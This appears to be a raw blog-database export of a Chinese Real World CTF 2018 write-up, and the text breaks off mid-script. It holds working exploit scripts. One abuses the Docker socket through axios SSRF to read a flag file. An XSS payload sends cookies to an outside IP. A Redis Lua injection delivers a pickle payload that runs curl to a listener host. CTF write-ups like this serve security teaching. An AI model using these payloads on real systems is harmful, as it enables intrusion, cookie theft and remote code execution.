这里直接使用`qs.stringify({...ctx.query}`,因而在render.js中\n\n   ```js\n   axios(req.body.url).then(r => {\n       ret.mdbody = md.render(r.data)\n       res.json(ret)\n   }\n   ```\n\n   `req.body.url` 可控\n\n4. 漏洞利用\n\n   **axios**这个东西是不支持**file://**协议的，但是通过文档可知，他支持**UNIX Socket** 。\n\n   ![](/assets/realworldctf/TIM截图20180802194917.png)\n\n   测试`ping`。\n\n   > GET http://54.183.55.10/print?url[url]=/_ping&url[socketPath]=/var/run/docker.sock&url=https://hackmd.io/ HTTP/1.1\n\n   ![](/assets/realworldctf/TIM截图20180802195456.png)\n\n5. exploit.py\n\n   ```python\n   import requests as req\n   import random\n   import string\n   from bs4 import BeautifulSoup\n   from urllib import quote as urlencode\n   \n   URL = \"http://54.183.55.10/print?{url}&url=https%3A%2F%2Fhackmd.io%2Fvbz2j6hkR9CIgABjEbRrzQ\"\n   \n   headers = {\n       \"User-Agent\": \"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\"\n   }\n   \n   \n   def get(u):\n       res = req.get(u, timeout=10, headers=headers)\n       if res.status_code == 200:\n           soup = BeautifulSoup(res.content, \"lxml\")\n           body = soup.select(\".markdown-body\")\n           if body:\n               print(body[0].text)\n               return True\n       print(\"[-] error\")\n   \n   \n   def fuck(_u):\n       _u += '&url[socketPath]=/var/run/docker.sock'\n       pl = URL.format(url=_u)\n       try:\n           get(pl)\n       except:\n           pass\n   \n   if __name__ == '__main__':\n       container_name = ''.join(random.sample(\n           string.ascii_letters + string.digits, 6))\n       _us = [\n           'url[url]=/_ping&',\n           'url[method]=post&url[url]=http://127.0.0.1/assets/create?fromImage=alpine:latest',\n           'url[method]=post&url[url]=http://127.0.0.1/containers/create?name=%s&url[data][Image]=alpine:latest&url[data][Volumes][flag][path]=/getflag&url[data][Binds][]=/flag:/getflag:ro&url[data][Entrypoint][]=/bin/ls' % container_name,\n           'url[method]=post&url[url]=http://127.0.0.1/containers/%s/start' % container_name,\n           'url[method]=get&url[url]=http://127.0.0.1/containers/%s/archive?path=/getflag' % container_name\n       ]\n       for i in _us:\n           fuck(i)\n   ```\n\n   exploit1.py\n\n   ```\n   #!/usr/bin/env python\n   # -*- coding: utf-8 -*-\n   #\n   # SakiiR @ Hexpresso\n   # cc XeR & BitK\n   # Let's go now (:\n   #\n   # --+ Python 2 +--\n   \n   import random\n   import pwn\n   import requests\n   import urllib\n   \n   urlencode = urllib.quote_plus\n   \n   OUTFILE = \"flag.txt\"\n   MAX_ROWS = 100\n   \n   \n   def random_container_name(n=10, charset=(\"abcdefghijklmnopqrstUVWXYZ\"\n                                            \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n                                            \"0123456789\")):\n       return ''.join([\n           charset[random.randint(0, len(charset) - 1)] for _ in range(n)\n       ])\n   \n   \n   def main():\n   \n       container_name = random_container_name()\n       pwn.log.info(\"Your container name is '{}'\".format(container_name))\n   \n       # Pull alpine image :)\n       # --------------------\n       endpoint = urlencode(\"http://127.0.0.1/assets/create?fromImage=alpine:latest\")\n       url = ('http://54.183.55.10/print'\n              '?url[method]=POST'\n              '&url[url]={}'\n              '&url[socketPath]=/var/run/docker.sock'\n              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)\n       pwn.log.info(\"Pulling alpine:      '{}[...]'\".format(url[:MAX_ROWS]))\n       r = requests.get(url)\n       pwn.log.info(\"Response: {}\".format(r.status_code))\n   \n       # Creating container (image)\n       # --------------------------\n       endpoint = urlencode('http://127.0.0.1/containers/create?name={}'.format(container_name))\n       url = ('http://54.183.55.10/print'\n              '?url[method]=POST'\n              '&url[url]={}'\n              '&url[data][Volumes][flag][path]=/sakiir'\n              '&url[data][Binds][]=/flag:/sakiir:ro'\n              '&url[data][Entrypoint][]=/bin/sh'\n              '&url[data][Image]=alpine:latest'\n              '&url[socketPath]=/var/run/docker.sock'\n              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)\n       pwn.log.info(\"Creating container:  '{}[...]'\".format(url[:MAX_ROWS]))\n       pwn.log.info(\"This will take some time then crash with a 503\")\n       pwn.log.info(\"The container will still be created (:\")\n       r = requests.get(url)\n       pwn.log.info(\"Response: {}\".format(r.status_code))\n   \n       # Starting container_name\n       # -----------------------\n       endpoint = urlencode('http://127.0.0.1/containers/{}/start'.format(container_name))\n       url = ('http://54.183.55.10/print'\n              '?url[method]=POST'\n              '&url[url]={}'\n              '&url[socketPath]=/var/run/docker.sock'\n              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)\n       pwn.log.info(\"Starting container:  '{}[...]'\".format(url[:MAX_ROWS]))\n       r = requests.get(url)\n       pwn.log.info(\"Response: {}\".format(r.status_code))\n   \n       # Archive container (Archive the /sakiir directory and get it back :))\n       # --------------------------------------------------------------------\n       endpoint = urlencode(\"http://127.0.0.1/containers/{}/archive?path=/sakiir\".format(container_name))\n       url = ('http://54.183.55.10/print'\n              '?url[method]=GET'\n              '&url[url]={}'\n              '&url[socketPath]=/var/run/docker.sock'\n              '&url=https://hackmd.io/rHsmjW2HRGGMwf7mbnecXw/download').format(endpoint)\n       pwn.log.info(\"Archiving container: '{}[...]'\".format(url[:MAX_ROWS]))\n       r = requests.get(url)\n       pwn.log.info(\"Response: {}\".format(r.status_code))\n       with open(OUTFILE, 'w') as f:\n           f.write(r.content)\n           pwn.log.info(\"Flag written to file '{}'\".format(OUTFILE))\n   \n   \n   if __name__ == '__main__':\n       main()\n   ```\n\n## pwn\n\n### state-of-the-art vm\n\ndescription:\n\n```text\npwn\n\nLatest QEMU is unbreakable, and we also hardened it.\n\nNOTE: Host OS is Ubuntu 16.04\n\nDownloads: https://s3-us-west-1.amazonaws.com/realworldctf/state-of-the-art_vm_ddde3799c4dc2936eb182ec3dbefdfef.zip\n\nnc 34.236.229.208 31338\n\nHint: Check start.sh\n```\n\n### Spectre-Free\n\n```\npwn\n\nThe spectre's paper told me that the vulnerability can only be used to achieve information discloure, while I don't care about infoleak. Why not use it to exchange superior performance?\n\nDownloads: https://s3-us-west-1.amazonaws.com/realworldctf/togiveout.tgz.b5b489f104f50d9c5342ccf7180add5c\n\nhttp://34.236.229.208\n\nHint: If you are not a master of Spectre, maybe you can use some unpatched 1day bug.\n\nHint 2: The spectre's patch happens to make certain bugs unable to be triggered. Hence Microsoft is lazy, so they may not even analyze or patch those bugs. Try to retrieve some unpatched 1 day bugs please.Also I found a tweet which may be related to this.\n```\n\n### kid vm\n\n```\npwn Writing a vm is the best way to teach kids to learn vm escape.\n\nDownloads: https://s3-us-west-1.amazonaws.com/realworldctf/kid_vm_801180ca894848965a2d6424472e0acb.zip\n\nnc 34.236.229.208 9999\n```\n\n### p90  RUSH B\n\n```\npwn\n\nWhen Cloud9 won the Major at Boston in 2018, another war starts off the cyberspace. The CTF players who enthuse about CS:GO not only want to run inside the Dust2 but also \"\"run\"\" outside the map. There is a challenge for guys who don't wanna be stuck in jail. Have fun with the Counter-Strike :)\n\nHere is a readme for you https://www.dropbox.com/s/3nn5pwukg5mk6k6/readme.md?dl=0\n\nA CS:GO server template: https://www.dropbox.com/s/7v48wdctx83d1lw/CSGO_Server_5ea3610faacd5b3bae1e97e33927caaf.zip?dl=0\n```\n\n### untrustworthy\n\n```\npwn\n\nDon't trust everything you see. There are secrets hidden in plain sight.\n\nnc 18.211.57.236 13337\n\nhttps://s3-us-west-1.amazonaws.com/realworldctf/distrib.zip\n```\n\n","slug":"real-world-ctf","published":1,"updated":"2018-08-06T12:30:06.081Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12ie001mqkdlohw425so","content":"<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"dot-free\"><a href=\"#dot-free\" class=\"headerlink\" title=\"dot free\"></a>dot free</h3><ol>\n<li><p>ip2long</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip_addr=&apos;192.168.2.10&apos;</span><br><span class=\"line\"></span><br><span class=\"line\"># transfer ip to int</span><br><span class=\"line\">def ip2long(ip):</span><br><span class=\"line\">    ip_list=ip.split(&apos;.&apos;)</span><br><span class=\"line\">    result=0</span><br><span class=\"line\">    for i in range(4):  #0,1,2,3</span><br><span class=\"line\">        result=result+int(ip_list[i])*256**(3-i)</span><br><span class=\"line\">    return result</span><br><span class=\"line\"></span><br><span class=\"line\">long=3232236042</span><br><span class=\"line\"></span><br><span class=\"line\"># transfer int to ip</span><br><span class=\"line\">def long2ip(long):</span><br><span class=\"line\">    floor_list=[]</span><br><span class=\"line\">    yushu=long</span><br><span class=\"line\">    for i in reversed(range(4)):   #3,2,1,0</span><br><span class=\"line\">        res=divmod(yushu,256**i)</span><br><span class=\"line\">        floor_list.append(str(res[0]))</span><br><span class=\"line\">        yushu=res[1]</span><br><span class=\"line\">    return &apos;.&apos;.join(floor_list)</span><br><span class=\"line\"></span><br><span class=\"line\">a=long2ip(long)</span><br><span class=\"line\">print(a)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>关键代码</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">'message'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (e.data.iframe) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (e.data.iframe &amp;&amp; e.data.iframe.value.indexOf(<span class=\"string\">'.'</span>) == <span class=\"number\">-1</span> &amp;&amp; e.data.iframe.value.indexOf(<span class=\"string\">\"//\"</span>) == <span class=\"number\">-1</span> &amp;&amp; e.data.iframe.value.indexOf(<span class=\"string\">\"。\"</span>) == <span class=\"number\">-1</span> &amp;&amp; e.data.iframe.value &amp;&amp; <span class=\"keyword\">typeof</span>(e.data.iframe != <span class=\"string\">'object'</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (e.data.iframe.type == <span class=\"string\">\"iframe\"</span>) &#123;</span><br><span class=\"line\">                    lce(doc, [<span class=\"string\">'iframe'</span>, <span class=\"string\">'width'</span>, <span class=\"string\">'0'</span>, <span class=\"string\">'height'</span>, <span class=\"string\">'0'</span>, <span class=\"string\">'src'</span>, e.data.iframe.value], parent);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    lls(e.data.iframe.value)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"built_in\">window</span>.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">ev</span>) </span>&#123;</span><br><span class=\"line\">        postMessage(<span class=\"built_in\">JSON</span>.parse(<span class=\"built_in\">decodeURIComponent</span>(location.search.substr(<span class=\"number\">1</span>))), <span class=\"string\">'*'</span>)</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>输入点</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">decodeURIComponent(location.search.substr(1))</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>bypass</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">e.data.iframe.value.indexOf(&quot;//&quot;) == -1</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">http:/\\</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;.&quot; 和 &quot;。&quot;均不能使用</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">使用ip2long bypass</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://13.57.104.34/?&#123;%22iframe%22:&#123;%22value%22:%22http:\\u002f\\u005c2077186703:1234%22&#125;&#125;</span><br><span class=\"line\">或者不要`http:` =&gt;</span><br><span class=\"line\">http://13.57.104.34/?&#123;%22iframe%22:&#123;%22value%22:%20%22\\u002f\\u005c2077186703:1234/a%22&#125;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>getflag</p>\n<p>index.html</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.location=&quot;http://123.207.90.143?flag=&quot;+document.cookie;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rwctf%7BL00kI5TheFlo9%7D</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"bookhub\"><a href=\"#bookhub\" class=\"headerlink\" title=\"bookhub\"></a>bookhub</h3><ol>\n<li><p>测试登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your ip address isn&apos;t in the 10.0.0.0/8,127.0.0.0/8,172.16.0.0/12,192.168.0.0/16,18.213.16.123.</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>进入代码查看</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def get_remote_addr():</span><br><span class=\"line\">    address = flask.request.headers.get(&apos;X-Forwarded-For&apos;, flask.request.remote_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">    try:</span><br><span class=\"line\">        ipaddress.ip_address(address)</span><br><span class=\"line\">    except ValueError:</span><br><span class=\"line\">        return None</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return address</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>测试修改X-Forwarded-For，失败，原因: XFF做了反代理，伪造的 XFF被覆盖</p>\n</li>\n<li><p>打开 18.213.16.123:5000</p>\n<p>发现该服务运行于debug模式下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@login_required</span><br><span class=\"line\">@user_blueprint.route(&apos;/admin/system/refresh_session/&apos;, methods=[&apos;POST&apos;])</span><br><span class=\"line\">def refresh_session():</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">        delete all session except the logined user</span><br><span class=\"line\"></span><br><span class=\"line\">        :return: json</span><br><span class=\"line\">        &quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">        status = &apos;success&apos;</span><br><span class=\"line\">        sessionid = flask.session.sid</span><br><span class=\"line\">        prefix = app.config[&apos;SESSION_KEY_PREFIX&apos;]</span><br><span class=\"line\"></span><br><span class=\"line\">        if flask.request.form.get(&apos;submit&apos;, None) == &apos;1&apos;:</span><br><span class=\"line\">            try:</span><br><span class=\"line\">                rds.eval(rf&apos;&apos;&apos;</span><br><span class=\"line\">                local function has_value (tab, val)</span><br><span class=\"line\">                    for index, value in ipairs(tab) do</span><br><span class=\"line\">                        if value == val then</span><br><span class=\"line\">                            return true</span><br><span class=\"line\">                        end</span><br><span class=\"line\">                    end</span><br><span class=\"line\">                </span><br><span class=\"line\">                    return false</span><br><span class=\"line\">                end</span><br><span class=\"line\">                </span><br><span class=\"line\">                local inputs = &#123;&#123; &quot;&#123;prefix&#125;&#123;sessionid&#125;&quot; &#125;&#125;</span><br><span class=\"line\">                local sessions = redis.call(&quot;keys&quot;, &quot;&#123;prefix&#125;*&quot;)</span><br><span class=\"line\">                </span><br><span class=\"line\">                for index, sid in ipairs(sessions) do</span><br><span class=\"line\">                    if not has_value(inputs, sid) then</span><br><span class=\"line\">                        redis.call(&quot;del&quot;, sid)</span><br><span class=\"line\">                    end</span><br><span class=\"line\">                end</span><br><span class=\"line\">                &apos;&apos;&apos;, 0)</span><br><span class=\"line\">            except redis.exceptions.ResponseError as e:</span><br><span class=\"line\">                app.logger.exception(e)</span><br><span class=\"line\">                status = &apos;fail&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">        return flask.jsonify(dict(status=status))</span><br></pre></td></tr></table></figure>\n<p>上边这一段代码由于<code>@login_required</code> 写在route上边，所以存在未授权访问。</p>\n<p><img src=\"/assets/realworldctf/TIM截图20180801194537.png\" alt=\"\"></p>\n</li>\n<li><p>添加csrf_token</p>\n<p><img src=\"/assets/realworldctf/TIM截图20180801195906.png\" alt=\"\"></p>\n</li>\n<li><p>漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">local inputs = &#123;&#123; &quot;&#123;prefix&#125;&#123;sessionid&#125;&quot; &#125;&#125;</span><br><span class=\"line\">local sessions = redis.call(&quot;keys&quot;, &quot;&#123;prefix&#125;*&quot;)</span><br></pre></td></tr></table></figure>\n<p>这里使用字符串拼接，存在问题，可以通过闭合双引号，使得redis执行恶意代码。</p>\n</li>\n<li><p>跟踪<code>{prefix}</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">prefix = app.config[&apos;SESSION_KEY_PREFIX&apos;]</span><br><span class=\"line\"></span><br><span class=\"line\">app.config[&apos;SESSION_KEY_PREFIX&apos;] = &apos;bookhub:session:&apos;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>构造payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">af5e1a4c-23b2-4f87-abf6-96a60d61d8b3&quot;,redis evilcode,&quot;bookhub:session:tianji</span><br></pre></td></tr></table></figure>\n<p>结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123; &quot;bookhub:session:af5e1a4c-23b2-4f87-abf6-96a60d61d8b3&quot;,redis evilcode,&quot;bookhub:session:tianji&quot; &#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>参考文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</span><br><span class=\"line\">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>evil code</p>\n<blockquote>\n<p>redis.call(“set”,”bookhub:session:tianji”,反弹shell) </p>\n</blockquote>\n</li>\n<li><p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import cPickle</span><br><span class=\"line\">import os</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import re</span><br><span class=\"line\">import urllib</span><br><span class=\"line\"></span><br><span class=\"line\">DEBUG = 0</span><br><span class=\"line\"></span><br><span class=\"line\">URL = &quot;http://18.213.16.123:5000/&quot; if not DEBUG else &quot;http://127.0.0.1:5000/&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">class exp(object):</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        listen_ip = &quot;123.207.90.143&quot;</span><br><span class=\"line\">        listen_port = 1234</span><br><span class=\"line\">        s = &quot;&quot;&quot;curl 123.207.90.143:1234&quot;&quot;&quot;</span><br><span class=\"line\">        return (os.system,(s,))</span><br><span class=\"line\"></span><br><span class=\"line\">e = exp()</span><br><span class=\"line\">s = cPickle.dumps(e)</span><br><span class=\"line\">s_bypass = &quot;&quot;</span><br><span class=\"line\">for i in s:</span><br><span class=\"line\">    s_bypass +=&quot;string.char(%s)..&quot;%ord(i)</span><br><span class=\"line\">evilcode = &apos;&apos;&apos;redis.call(&quot;set&quot;,&quot;bookhub:session:tianji&quot;,%s)&apos;&apos;&apos;%s_bypass[:-2]</span><br><span class=\"line\">payload = &apos;&apos;&apos;2047a141-2493-4f81-b315-8b8d95d3db33&quot;,%s,&quot;bookhub:session:tianji&apos;&apos;&apos;%evilcode</span><br><span class=\"line\">payload = payload.replace(&quot; &quot;,&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &apos;__main__&apos;:</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        &quot;Cookie&quot;: &apos;bookhub-session=%s&apos; % payload,</span><br><span class=\"line\">        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class=\"line\">        &apos;X-CSRFToken&apos;: &apos;&apos;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    print headers[&quot;Cookie&quot;]</span><br><span class=\"line\"></span><br><span class=\"line\">    res = requests.get(URL + &apos;login/&apos;, headers=headers)</span><br><span class=\"line\">    if res.status_code == 200:</span><br><span class=\"line\">        html = res.content</span><br><span class=\"line\">        r = re.findall(r&apos;csrf_token&quot; type=&quot;hidden&quot; value=&quot;(.*?)&quot;&gt;&apos;, html)</span><br><span class=\"line\">        if r:</span><br><span class=\"line\">            headers[&apos;X-CSRFToken&apos;] = r[0]</span><br><span class=\"line\">            # refresh_session</span><br><span class=\"line\">            data = &#123;&apos;submit&apos;: &apos;1&apos;&#125;</span><br><span class=\"line\">            res = requests.post(URL + &apos;admin/system/refresh_session/&apos;,</span><br><span class=\"line\">                           data=data, headers=headers)</span><br><span class=\"line\">            if res.status_code == 200:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            # fuck</span><br><span class=\"line\">            headers[&apos;Cookie&apos;] = &apos;bookhub-session=tianji&apos;</span><br><span class=\"line\">            res = requests.get(URL + &apos;login/&apos;, headers=headers)</span><br><span class=\"line\">            if res.status_code == 200:</span><br><span class=\"line\">                print(res.content)</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                print(res.content)</span><br></pre></td></tr></table></figure>\n<p>收到响应。</p>\n<p><img src=\"/assets/realworldctf/TIM截图20180802110118.png\" alt=\"\"></p>\n</li>\n<li><p>修改payload，获取flag</p>\n<p>payload1:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import re</span><br><span class=\"line\">import json</span><br><span class=\"line\">import random</span><br><span class=\"line\">import string</span><br><span class=\"line\">import cPickle</span><br><span class=\"line\">import os</span><br><span class=\"line\">import urllib</span><br><span class=\"line\"></span><br><span class=\"line\">req = requests.Session()</span><br><span class=\"line\"></span><br><span class=\"line\">DEBUG = 0</span><br><span class=\"line\"></span><br><span class=\"line\">URL = &quot;http://18.213.16.123:5000/&quot; if not DEBUG else &quot;http://127.0.0.1:5000/&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def rs(n=6):</span><br><span class=\"line\">    return &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, n))</span><br><span 